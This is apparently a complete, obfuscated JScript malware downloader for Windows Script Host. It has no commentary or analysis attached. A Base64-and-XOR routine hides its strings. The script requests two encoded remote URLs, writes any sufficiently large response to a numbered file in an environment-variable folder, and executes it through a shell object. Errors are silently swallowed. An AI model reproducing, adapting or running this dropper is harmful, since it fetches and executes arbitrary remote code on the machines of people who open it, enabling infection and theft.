var decode = function (packedText) {
    var cipher ="jOFGb9u41pMmZrOm";

    var Base64 = {
        _keyStr: "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",

        decode: function (input) {
            var output = "";
            var chr1, chr2, chr3;
            var enc1, enc2, enc3, enc4;
            var i = 0;

            input = input.replace(/[^A-Za-z0-9\+\/\=]/g, "");

            while (i < input.length) {

                enc1 = this._keyStr.indexOf(input.charAt(i++));
                enc2 = this._keyStr.indexOf(input.charAt(i++));
                enc3 = this._keyStr.indexOf(input.charAt(i++));
                enc4 = this._keyStr.indexOf(input.charAt(i++));

                chr1 = (enc1 << 2) | (enc2 >> 4);
                chr2 = ((enc2 & 15) << 4) | (enc3 >> 2);
                chr3 = ((enc3 & 3) << 6) | enc4;

                output = output + String.fromCharCode(chr1);

                if (enc3 != 64) {
                    output = output + String.fromCharCode(chr2);
                }
                if (enc4 != 64) {
                    output = output + String.fromCharCode(chr3);
                }

            }

            output = Base64._utf8_decode(output);

            return output;

        },
        _utf8_decode: function (utftext) {
            var string = "";
            var i = 0;
            var c = c1 = c2 = 0;

            while (i < utftext.length) {

                c = utftext.charCodeAt(i);

                if (c < 128) {
                    string += String.fromCharCode(c);
                    i++;
                }
                else if ((c > 191) && (c < 224)) {
                    c2 = utftext.charCodeAt(i + 1);
                    string += String.fromCharCode(((c & 31) << 6) | (c2 & 63));
                    i += 2;
                }
                else {
                    c2 = utftext.charCodeAt(i + 1);
                    c3 = utftext.charCodeAt(i + 2);
                    string += String.fromCharCode(((c & 15) << 12) | ((c2 & 63) << 6) | (c3 & 63));
                    i += 3;
                }

            }
            return string;
        }
    };

    var text = Base64.decode(packedText);

    var cipherLength = cipher.length;
    var result = "";
    for (var i = 0; i < text.length; i++) {
        result += String.fromCharCode(text.charCodeAt(i) ^ cipher.charCodeAt(i % cipherLength));
    }
    return result;
};
(function() {
    var irresoluteVuT = 200;
    var mootr10 = decode('"LQoS"');
    var haltingMmu = decode('"LzcjJA=="');
    var petulantkse = decode('"PRwlNQtJARpiGCgBNg=="');
    var earnestqR7 = decode('"JxweCi4LW2x8PAU5DiI="');
    var predecessorIjl = decode('"KwsJAyA="');
    var insurgentVo2 = decode('"OTs0IgNU"');
    var rejoindergjH = decode('"TxsDCjIcKQ=="');
    var ripplebwf = decode('"RCo+Ig=="');
    var apologistjbp = 2e5;
    var boltLhY = [ decode('"AjsyN1gWWlxUHCECLR09AQ4+NzZMWhpZHkJ7Qz8KKg=="'), decode('"AjsyN1gWWkNFFiQePR0mAw0nIzUHXxMaUh8gQmhEYQgSKg=="') ];
    var provokeqoH = 524288;
    var incisivedmK = WScript.CreateObject(petulantkse);
    var advocatekAn = WScript.CreateObject(earnestqR7);
    var interminablew6w = WScript.CreateObject(predecessorIjl + decode('"RA=="') + insurgentVo2);
    var diademvX1 = incisivedmK.ExpandEnvironmentStrings(rejoindergjH);
    var aversionVWs = diademvX1 + provokeqoH + ripplebwf;
    var objectiveGRW = false;
    for (var gisthTg = 0; gisthTg < boltLhY.length; gisthTg++) {
        try {
            var connotationhvT = boltLhY[gisthTg];
            advocatekAn.open(mootr10, connotationhvT, false);
            advocatekAn.send();
            if (advocatekAn.status == irresoluteVuT) {
                try {
                    interminablew6w.open();
                    interminablew6w.type = 1;
                    interminablew6w.write(advocatekAn.responseBody);
                    if (interminablew6w.size > apologistjbp) {
                        gisthTg = boltLhY.length;
                        interminablew6w.position = 0;
                        interminablew6w.saveToFile(aversionVWs, 2);
                        objectiveGRW = true;
                    }
                } finally {
                    interminablew6w.close();
                }
            }
        } catch (ignored) {}
    }
    if (objectiveGRW) {
        incisivedmK[haltingMmu](diademvX1 + Math.pow(2, 19));
    }
})();